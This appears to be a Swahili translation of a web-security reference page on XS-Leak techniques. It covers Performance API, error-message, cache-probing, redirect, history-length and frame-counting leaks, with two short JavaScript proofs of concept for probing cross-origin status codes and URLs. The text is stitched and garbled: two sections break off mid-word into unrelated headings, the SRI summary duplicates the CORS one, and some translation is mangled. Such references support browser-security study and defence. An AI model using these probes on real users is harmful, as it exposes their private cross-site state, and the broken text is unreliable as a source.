* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Kutokana na kasoro katika kivinjari, ombi ambalo linaleta hitilafu linapakia mara mbili.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Katika mbinu iliyotangulia, pia iligunduliwa kuwa kuna kasoro za kivinjari katika GC ambazo husababisha **rasilmali kupakiwa mara mbili wakati hazipakii**. Hii itasababisha kuingia nyingi katika API ya Utendaji na hivyo inaweza kugunduliwa.

### Hitilafu ya Kuchanganya Ombi

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Ombi linalosababisha hitilafu halitaweza kuchanganywa.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Mbinu hii ilipatikana katika jedwali katika karatasi iliyotajwa lakini hakuna maelezo ya mbinu iliyopatikana. Hata hivyo, unaweza kupata nambari ya chanzo ikikagua hii katika [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Kuvuja kwa Ukurasa Tasa

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Majibu yasiyo na maudhui hayataunda kuingia cha wakati wa rasilmali.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Mshambuliaji anaweza kugundua ikiwa ombi limesababisha mwili wa majibu ya HTTP kuwa tupu kwa sababu **kurasa tupu haziumbi kuingia cha utendaji** katika vivinjari fulani.

### **Kuvuja kwa XSS-Auditor**

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Kwa kutumia XSS Auditor katika Security Assertions, wadukuzi wanaweza kugundua vipengele maalum vya ukurasa kwa kuchunguza mabadiliko katika majibu wakati mizigo iliyoundwa inasababisha utaratibu wa kuchuja wa auditor.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Katika Security Assertions (SA), XSS Auditor, ambayo awali ilikuwa imekusudiwa kuzuia mashambulizi ya Cross-Site Scripting (XSS), inaweza kwa kushangaza kutumiwa kuvuja habari nyeti. Ingawa kipengele hiki kilichojengwa kimeondolewa kutoka Google Chrome (GC), bado kipo katika SA. Mwaka 2013, Braun na Heiderich walidhihirisha kuwa XSS Auditor inaweza kuzuia skripti halali kwa bahati mbaya, ikisababisha matokeo sahihi ya uwongo. Kujenga juu ya hili, watafiti wameendeleza mbinu za kuchota habari na kugundua maudhui maalum kwenye kurasa za asili tofauti, dhana inayojulikana kama XS-Leaks, iliripotiwa awali na Terada na kufafanuliwa na Heyes katika chapisho la blogu. Ingawa mbinu hizi zilikuwa maalum kwa XSS Auditor katika GC, iligundulika kuwa katika SA, kurasa zilizozuiliwa na XSS Auditor hazizalishi kuingia katika API ya Utendaji, kuonyesha njia ambayo habari nyeti inaweza bado kuvuja.

### Kuvuja kwa X-Frame
### Mwanzo wa Kuelekeza Kuvuja

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Kuelekeza
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Kuingia kwa wakati wa rasilimali hufichua wakati wa mwanzo wa kuelekeza.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Tuligundua kisa kimoja cha XS-Leak kinachotumia tabia ya baadhi ya vivinjari ambavyo hurekodi habari nyingi kwa ombi za asili. Kiwango kinatambua sehemu ya sifa ambazo zinapaswa kuwekwa kuwa sifuri kwa rasilimali za asili. Walakini, katika **SA**, inawezekana kugundua ikiwa mtumiaji anaelekezwa na ukurasa wa lengo, kwa kuuliza **API ya Utendaji** na kuangalia data ya wakati ya **redirectStart**.

### Kuvuja kwa Muda wa Kuelekeza

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Kuelekeza
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Muda wa kuingia unakuwa hasi wakati kuna kuelekeza.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Katika GC, **muda** wa maombi ambayo yanapelekea **kuelekeza** ni **hasi** na kwa hivyo inaweza **kutofautishwa** na maombi ambayo hayapelekei kuelekeza.

### Kuvuja kwa CORP

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Kichwa
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Muhtasari:** Rasilimali zilizolindwa na CORP haziumbi kuingia za wakati wa rasilimali.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Katika baadhi ya kesi, kuingia la **nextHopProtocol** linaweza kutumika kama mbinu ya kuvuja. Katika GC, wakati kichwa cha **CORP** kinawekwa, nextHopProtocol itakuwa **tupu**. Tafadhali kumbuka kuwa SA haitaunda kuingia cha utendaji kabisa kwa rasilimali zilizowezeshwa na CORP.

### Mfanyakazi wa Huduma

* **Njia za Kuingiza**: Fremu
* **Tofauti Inayoweza Kugundulika**: Matumizi ya API
* **Maelezo Zaidi**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Muhtasari:** Kugundua ikiwa mfanyakazi wa huduma amesajiliwa kwa asili fulani.
* **Mfano wa Kanuni**:

Wafanyakazi wa huduma ni muktadha wa skripti unaosukumwa na matukio ambao hufanya kazi kwenye asili. Wanafanya kazi nyuma ya ukurasa wa wavuti na wanaweza kuvamia, kubadilisha, na **kunakili rasilimali** ili kuunda programu za wavuti zinazofanya kazi nje ya mtandao.\
Ikiwa **rasilimali iliyonakiliwa** na mfanyakazi wa huduma inafikiwa kupitia **iframe**, rasilimali hiyo itakuwa **imepakiwa kutoka kwenye akiba ya mfanyakazi wa huduma**.\
Kutambua ikiwa rasilimali imepakiwa kutoka kwenye akiba ya mfanyakazi wa huduma inaweza kufanywa kwa kutumia **API ya Utendaji**.\
Hii pia inaweza kufanywa na shambulio la Timing (angalia karatasi kwa maelezo zaidi).

### Akiba

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Wakati
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Muhtasari:** Inawezekana kuchunguza ikiwa rasilimali imehifadhiwa kwenye akiba.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Kwa kutumia [API ya Utendaji](xs-search.md#performance-api), inawezekana kuchunguza ikiwa rasilimali imehifadhiwa kwenye akiba.

### Muda wa Mtandao

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Muhtasari:** Inawezekana kupata muda wa mtandao wa ombi kutoka kwa API ya `utendaji`.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Mbinu ya Ujumbe wa Kosa

### Kosa la Vyombo vya Habari

* **Njia za Kuingiza**: Vipengele vya HTML (Video, Sauti)
* **Tofauti Inayoweza Kugundulika**: Kanuni ya Hali
* **Maelezo Zaidi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Muhtasari:** Katika Firefox, inawezekana kuvuja kwa usahihi kanuni ya hali ya ombi la asili la asili.
* **Mfano wa Kanuni**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
`MediaError` kipengele cha mali ya ujumbe kinatambua rasilimali ambazo zimepakiwa kwa mafanikio na herufi tofauti. Mshambuliaji anaweza kutumia kipengele hiki kwa kuchunguza maudhui ya ujumbe, hivyo kugundua hali ya majibu ya rasilimali ya asili ya msalaba.

### Kosa la CORS

* **Njia za Uingizaji**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Kichwa
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Muhtasari:** Katika Madai ya Usalama (SA), ujumbe wa kosa la CORS kwa bahati mbaya unaonyesha URL kamili ya maombi yaliyopewa mwelekeo mwingine.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Teknolojia hii inawezesha mshambuliaji kuchukua **mahali pa marudio ya upya wa tovuti ya asili ya msalaba** kwa kuchexploit jinsi vivinjari vilivyotegemea Webkit vinavyoshughulikia maombi ya CORS. Kwa usahihi, wakati maombi yaliyowezeshwa na CORS yanatumwa kwa tovuti ya lengo ambayo inatoa upya kulingana na hali ya mtumiaji na kivinjari kinakataa maombi baadaye, **URL kamili ya marudio ya upya** inafichuliwa ndani ya ujumbe wa kosa. Udhaifu huu sio tu unaonyesha ukweli wa upya lakini pia unaonyesha mwisho wa upya na **parameta nyeti za utafutaji** inaweza kuwa nayo.

### Kosa la SRI

* **Njia za Uingizaji**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Kichwa
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Muhtasari:** Katika Madai ya Usalama (SA), ujumbe wa kosa la CORS kwa bahati mbaya unaonyesha URL kamili ya maombi yaliyopewa mwelekeo mwingine.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Mshambuliaji anaweza kuchexploit **ujumbe mrefu wa kosa** ili kugundua ukubwa wa majibu ya asili ya msalaba. Hii inawezekana kutokana na utaratibu wa Usalama wa Rasilimali ya Pembejeo (SRI), ambayo hutumia sifa ya ukamilifu kuhakikisha kuwa rasilimali zinazopakuliwa, mara nyingi kutoka kwa CDNs, hazijabadilishwa. Ili SRI ifanye kazi kwenye rasilimali za asili ya msalaba, lazima ziwe **zimeidhinishwa na CORS**; vinginevyo, hazitahusishwa na ukaguzi wa ukamilifu. Katika Madai ya Usalama (SA), kama kosa la CORS XS-Leak, ujumbe wa kosa unaweza kukamatwa baada ya ombi la kupakua na sifa ya ukamilifu kushindwa. Wadukuzi wanaweza kwa makusudi **kuzidisha kosa hili** kwa kutoa **thamani ya hash bandia** kwa sifa ya ukamilifu ya ombi lolote. Katika SA, ujumbe wa kosa unaofuatia kwa bahati mbaya unaonyesha urefu wa yaliyomo ya rasilimali iliyoombwa. Kuvuja kwa habari hii kunaruhusu mshambuliaji kutambua tofauti katika ukubwa wa majibu, kufungua njia kwa mashambulizi ya XS-Leak yenye utata.

### Kuki ya CSP

* **Njia za Uingizaji**: Pop-ups
* **Tofauti Inayoweza Kugundulika**: Kanuni ya Hali
* **Maelezo Zaidi**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Muhtasari:** Kwa kuruhusu tovuti ya waathiriwa tu katika CSP ikiwa tunapata jaribio la kuhamisha mwelekeo kwa kikoa kingine, CSP itasababisha kosa linaloweza kugundulika.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

XS-Leak inaweza kutumia CSP kugundua ikiwa tovuti ya asili ya msalaba ilielekezwa kwa asili tofauti. Kuvuja hii inaweza kugundua upya, lakini zaidi ya hayo, kikoa cha marudio cha upya kinavuja. Wazo msingi la shambulio hili ni **kuruhusu kikoa cha lengo kwenye tovuti ya mshambuliaji**. Mara tu ombi linapotumwa kwa kikoa cha lengo, kinapata **mwelekeo** kwa kikoa cha asili ya msalaba. **CSP inazuia** upatikanaji wake na kuunda **ripoti ya uvunjaji inayotumiwa kama mbinu ya kuvuja**. Kulingana na kivinjari, **ripoti hii inaweza kufichua mahali pa marudio ya upya**.\
Vivinjari vya kisasa havitaonyesha URL ilielekezwa kwenda, lakini bado unaweza kugundua kuwa upya wa asili ya msalaba ulisababishwa.

### Hifadhi

* **Njia za Uingizaji**: Fremu, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Muhtasari:** Futa faili kutoka kwenye hifadhi. Fungua ukurasa wa lengo na angalia ikiwa faili iko kwenye hifadhi.
* **Mfano wa Kanuni:**

Vivinjari vinaweza kutumia hifadhi moja iliyoshirikiwa kwa tovuti zote. Bila kujali asili yao, inawezekana kubainisha ikiwa ukurasa wa lengo umefanya **ombi la faili maalum**.

Ikiwa ukurasa unapakia picha tu ikiwa mtumiaji ameingia, unaweza **kufuta** **rasilimali** (hivyo haifungwi tena kwenye hifadhi ikiwa ilikuwa, angalia viungo vya maelezo zaidi), **fanya ombi** ambalo linaweza kupakia rasilimali hiyo na jaribu kupakia rasilimali **kwa ombi baya** (kwa mfano, kutumia kichwa cha kurejelea kirefu). Ikiwa kupakia rasilimali hakusababisha **kosa lolote**, ni kwa sababu ilikuwa **imehifadhiwa**.

### Mwongozo wa CSP

* **Njia za Uingizaji**: Fremu
* **Tofauti In
### CORB

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Vichwa vya habari
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Muhtasari**: CORB inaweza kuruhusu wadukuzi kugundua wakati kichwa cha **`nosniff` kipo** katika ombi.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Angalia kiungo kwa maelezo zaidi kuhusu shambulio hili.

### Hitilafu ya CORS kwenye Usanidi Mbaya wa Kurejelea Asili <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Vichwa vya habari
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Muhtasari**: Ikiwa kichwa cha Asili kinaonekana katika kichwa cha `Access-Control-Allow-Origin`, inawezekana kuchunguza ikiwa rasilimali tayari iko katika hifadhi.
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

Ikiwa kichwa cha Asili kinaonekana katika kichwa cha `Access-Control-Allow-Origin`, mshambuliaji anaweza kutumia tabia hii kujaribu **kupata** rasilimali katika hali ya **CORS**. Ikiwa **hitilafu** haijasababishwa, inamaanisha kuwa ilipatikana **kwa usahihi kutoka kwenye wavuti**, ikiwa hitilafu imesababishwa, ni kwa sababu ilipatikana kutoka kwenye **hifadhi** (hitilafu inaonekana kwa sababu hifadhi inahifadhi jibu na kichwa cha CORS kinachoruhusu kikoa cha asili na sio kikoa cha mshambuliaji).\
Tafadhali kumbuka kuwa ikiwa asili haijarejelewa lakini alama ya wilcard inatumika (`Access-Control-Allow-Origin: *`), hii haitafanya kazi.

## Mbinu ya Kusoma Atributi

### Ufikiaji wa Upya

* **Njia za Kuingiza**: Fetch API
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali
* **Maelezo Zaidi**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Muhtasari**: GC na SA inaruhusu kuchunguza aina ya jibu (opaque-redirect) baada ya upyaishaji kukamilika.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

Kwa kuwasilisha ombi kwa kutumia Fetch API na `redirect: "manual"` na vigezo vingine, inawezekana kusoma sifa ya `response.type` na ikiwa ni sawa na `opaqueredirect` basi jibu lilikuwa ni upyaishaji.

### COOP

* **Njia za Kuingiza**: Pop-ups
* **Tofauti Inayoweza Kugundulika**: Kichwa cha habari
* **Maelezo Zaidi**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Muhtasari**: Kurasa zilizolindwa na Sera ya Cross-Origin Opener (COOP) zinazuia ufikiaji kutoka kwa mwingiliano wa asili.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

Mshambuliaji anaweza kugundua uwepo wa kichwa cha Sera ya Cross-Origin Opener (COOP) katika jibu la HTTP la asili. COOP hutumiwa na programu za wavuti kuzuia tovuti za nje kupata marejeleo ya dirisha yoyote. Uonekano wa kichwa hiki unaweza kugunduliwa kwa kujaribu kufikia kumbukumbu ya **`contentWindow`**. Katika hali ambapo COOP inatumika kwa hiari, mali ya **`opener`** inakuwa ni ishara ya wazi: inakuwa **haijafafanuliwa** wakati COOP inafanya kazi, na **imefafanuliwa** wakati haipo.

### Urefu Maksimumu wa URL - Upande wa Seva

* **Njia za Kuingiza**: Fetch API, Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Nambari ya Hali / Yaliyomo
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Muhtasari**: Gundua tofauti katika majibu kwa sababu ya urefu wa jibu la upyaishaji unaweza kuwa mkubwa sana hivi kwamba seva inajibu na kosa na arifa inazalishwa.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

Ikiwa upyaishaji wa upande wa seva unatumia **data ya mtumiaji ndani ya upyaishaji** na **data ya ziada**. Inawezekana kugundua tabia hii kwa sababu kawaida **seva** ina **kikomo cha urefu wa ombi**. Ikiwa **data ya mtumiaji** ni sawa na **urefu huo - 1**, kwa sababu **upyaishaji** unatumia **data hiyo** na **kuongeza** kitu **ziada**, itasababisha **hitilafu inayoweza kugundulika kupitia Matukio ya Hitilafu**.

Ikiwa kwa namna fulani unaweza kuweka vidakuzi kwa mtumiaji, unaweza pia kufanya shambulio hili kwa **kuweka vidakuzi vya kutosha** ([**cookie bomb**](hacking-with-cookies/cookie-bomb.md)) ili kwa **ukubwa uliongezeka wa jibu sahihi** hitilafu itasababishwa. Katika kesi hii, kumbuka kuwa ikiwa unasababisha ombi hili kutoka kwenye tovuti ile ile, `<script>` itatuma vidakuzi kiotomatiki (hivyo unaweza kuchunguza hitilafu).\
Mfano wa **cookie bomb + XS-Search** unaweza kupatikana katika suluhisho lililokusudiwa la andishi hili: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli
### Mipaka ya Uelekezaji

* **Njia za Kuingiza**: Fetch API, Frames
* **Tofauti Inayoweza Kugundulika**: Kificho cha Hali
* **Maelezo Zaidi**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **Muhtasari:** Tumia kikomo cha uelekezaji cha kivinjari ili kubaini kama kuna uelekezaji wa URL.
* **Mfano wa Kificho**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Ikiwa idadi **kubwa** ya **uelekezaji** wa kufuata wa kivinjari ni **20**, mshambuliaji anaweza kujaribu kupakia ukurasa wake na **uelekezaji wa 19** na hatimaye **kumtuma mhanga** kwenye ukurasa uliojaribiwa. Ikiwa **kosa** linasababishwa, basi ukurasa ulikuwa unajaribu **kumuelekeza mhanga**.

### Urefu wa Historia

* **Njia za Kuingiza**: Frames, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Uelekezaji
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Muhtasari:** Kificho cha JavaScript kinabadilisha historia ya kivinjari na inaweza kupatikana kupitia mali ya urefu.
* **Mfano wa Kificho**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

API ya **Historia** inaruhusu kificho cha JavaScript kubadilisha historia ya kivinjari, ambayo **inahifadhi kurasa zilizotembelewa na mtumiaji**. Mshambuliaji anaweza kutumia mali ya urefu kama njia ya kuingiza: kugundua uendeshaji wa JavaScript na HTML.\
**Kwa kuangalia `history.length`**, kumfanya mtumiaji **atembee** kwenye ukurasa, **ubadilishe** kurudi **kwenye asili ile ile** na **kuchunguza** thamani mpya ya **`history.length`**.

### Urefu wa Historia na URL sawa

* **Njia za Kuingiza**: Frames, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Ikiwa URL ni sawa na ile iliyokisiwa
* **Muhtasari:** Inawezekana kudhani ikiwa eneo la fremu/pop-up liko kwenye URL maalum kwa kudhulumu urefu wa historia.
* **Mfano wa Kificho**: Hapa chini

Mshambuliaji anaweza kutumia kificho cha JavaScript ku **badilisha eneo la fremu/pop-up kuwa moja iliyokisiwa** na **mara moja** **kubadilisha kuwa `about:blank`**. Ikiwa urefu wa historia uliongezeka, inamaanisha URL ilikuwa sahihi na ilikuwa na wakati wa **kuongezeka kwa sababu URL haipakii tena ikiwa ni ile ile**. Ikiwa haikuongezeka, inamaanisha ilijaribu kupakia URL iliyokisiwa lakini kwa sababu **tulipakia mara moja** **`about:blank`** baada ya kupakia URL iliyokisiwa, **urefu wa historia haukuongezeka kamwe**.
```javascript
async function debug(win, url) {
win.location = url + '#aaa';
win.location = 'about:blank';
await new Promise(r => setTimeout(r, 500));
return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Kuhesabu Fremu

* **Njia za Kuingiza**: Fremu, Pop-ups
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **Muhtasari:** Tathmini idadi ya vipengele vya fremu kwa kuangalia mali ya `window.length`.
* **Mfano wa Kanuni**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Kuhesabu **idadi ya fremu** katika wavuti iliyofunguliwa kupitia `iframe` au `window.open` inaweza kusaidia kutambua **hali ya mtumiaji kwenye ukurasa huo**.\
Zaidi ya hayo, ikiwa ukurasa una idadi sawa ya fremu daima, kuangalia **kwa muda** idadi ya fremu kunaweza kusaidia kutambua **muundo** ambao unaweza kuvuja habari.

Mfano wa mbinu hii ni kwamba katika Chrome, **PDF** inaweza **kugunduliwa** kwa kutumia **uhesabuji wa fremu** kwa sababu `embed` hutumiwa ndani. Kuna [Parameta za URL Zilizofunguliwa](https://bugs.chromium.org/p/chromium/issues/detail?id=64309#c113) ambazo huruhusu udhibiti fulani juu ya yaliyomo kama vile `zoom`, `view`, `page`, `toolbar` ambapo mbinu hii inaweza kuwa ya kuvutia.

### HTMLElements

* **Njia za Kuingiza**: Vipengele vya HTML
* **Tofauti Inayoweza Kugundulika**: Yaliyomo ya Ukurasa
* **Maelezo Zaidi**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/)
* **Muhtasari:** Soma thamani iliyovuja ili kutofautisha kati ya hali mbili zinazowezekana
* **Mfano wa Kanuni**: [https://xsleaks.dev/docs/attacks/element-leaks/](https://xsleaks.dev/docs/attacks/element-leaks/), [https://xsinator.com/testing.html#Media%20Dimensions%20Leak](https://xsinator.com/testing.html#Media%20Dimensions%20Leak), [https://xsinator.com/testing.html#Media%20Duration%20Leak](https://xsinator.com/testing.html#Media%20Duration%20Leak)

Uvuaji wa habari kupitia vipengele vya HTML ni wasiwasi katika usalama wa wavuti, haswa wakati faili za media za kibinafsi zinazalishwa kulingana na habari ya mtumiaji, au wakati alama za maji zinaongezwa, zikibadilisha ukubwa wa media. Hii inaweza kutumiwa na wadukuzi kutofautisha kati ya hali mbili kwa kuchambua habari inayofichuliwa na vipengele fulani vya HTML.

### Habari Inayofichuliwa na Vipengele vya HTML

- **HTMLMediaElement**: Kipengele hiki kinaonyesha `muda` na `buffered` ya media, ambayo inaweza kupatikana kupitia API yake.
[Soma zaidi kuhusu HTMLMediaElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLMediaElement)
- **HTMLVideoElement**: Inafichua `videoHeight` na `videoWidth`. Katika vivinjari fulani, mali za ziada kama `webkitVideoDecodedByteCount`, `webkitAudioDecodedByteCount`, na `webkitDecodedFrameCount` zinapatikana, zikitoa habari zaidi kuhusu yaliyomo ya media.
[Soma zaidi kuhusu HTMLVideoElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLVideoElement)
- **getVideoPlaybackQuality()**: Kazi hii hutoa maelezo kuhusu ubora wa upigaji video, ikiwa ni pamoja na `totalVideoFrames`, ambayo inaweza kuonyesha kiasi cha data ya video iliyosindika.
[Soma zaidi kuhusu getVideoPlaybackQuality()](https://developer.mozilla.org/en-US/docs/Web/API/VideoPlaybackQuality)
- **HTMLImageElement**: Kipengele hiki kinafichua `urefu` na `upana` wa picha. Walakini, ikiwa picha ni batili, mali hizi zitarudi 0, na kazi ya `image.decode()` itakataliwa, ikionyesha kushindwa kupakia picha kwa usahihi.
[Soma zaidi kuhusu HTMLImageElement](https://developer.mozilla.org/en-US/docs/Web/API/HTMLImageElement)


